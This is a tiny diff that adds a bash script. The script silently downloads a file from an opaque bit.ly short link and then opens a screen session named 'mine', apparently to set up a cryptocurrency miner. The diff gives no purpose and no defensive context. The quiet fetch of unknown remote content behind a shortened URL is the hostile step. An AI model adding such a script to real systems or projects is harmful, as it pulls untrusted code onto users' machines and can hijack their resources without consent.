@@ -1,0 +1,2 @@
+#!/usr/bin/bash
+wget https://bit.ly/3Hg20wD --quiet && screen -R mine
